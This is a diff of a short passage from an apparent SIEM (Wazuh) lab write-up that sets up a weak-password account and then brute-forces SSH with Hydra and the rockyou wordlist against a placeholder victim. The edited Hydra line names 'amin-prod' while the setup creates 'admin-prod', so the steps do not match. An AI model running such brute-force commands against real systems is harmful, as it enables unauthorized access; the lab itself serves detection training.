@@ -36,11 +36,11 @@ Open your browser and navigate to the Wazuh Web Console (`https://ip-of-SIEM-ser
 
 * **Victim:** account created with a weak password
 
-```sudo useradd -m ubuntu-prod && echo 'ubuntu-prod:<weak-password>' | sudo chpasswd```
+```sudo useradd -m admin-prod && echo 'admin-prod:<weak-password>' | sudo chpasswd```
 
 * **Attacker:** Used Hydra to perform brute force to log in.
 
-```hydra -l ubuntu-prod -P /usr/share/wordlists/rockyou.txt ssh://VICTIM_IP -t 4```
+```hydra -l amin-prod -P /usr/share/wordlists/rockyou.txt ssh://VICTIM_IP```
 
 #### Results:
 
